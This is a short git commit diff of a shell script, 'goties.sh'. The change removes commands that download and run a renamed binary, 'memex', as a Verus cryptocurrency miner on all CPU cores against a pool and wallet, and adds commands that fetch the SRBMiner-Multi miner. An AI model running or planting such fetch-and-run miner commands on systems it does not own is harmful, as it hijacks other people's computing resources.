b22122c50e9f7502fc47dde2fba75ccdb40f9639
Frotinor <reysanju1999@gmail.com>
2024-12-14 03:41:46 +0700

    Update goties.sh

--- goties.sh
+++ goties.sh
@@ -1,8 +1,3 @@
-wget http://nz2.archive.ubuntu.com/ubuntu/pool/main/o/openssl/libssl1.1_1.1.1-1ubuntu2.1~18.04.23_amd64.deb
-dpkg -i libssl1.1_1.1.1-1ubuntu2.1~18.04.23_amd64.deb
-apt-get install libjansson4 -y
-apt --fix-broken install -y
-apt-get install libjansson4 -y
-wget https://github.com/fikriboehimi/hgoeshfew/raw/refs/heads/main/memex
-chmod +x memex
-./memex -a verus -o stratum+tcp://us.vipor.net:5040 -u RTth6ZswVosWc6jwTgugSVpZaen6aSCUzu.Device -p x -t $(nproc)
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.9/SRBMiner-Multi-2-6-9-Linux.tar.gz && \
+tar -xvf SRBMiner-Multi-2-6-9-Linux.tar.gz && \
+cd SRBMiner-Multi-2-6-9
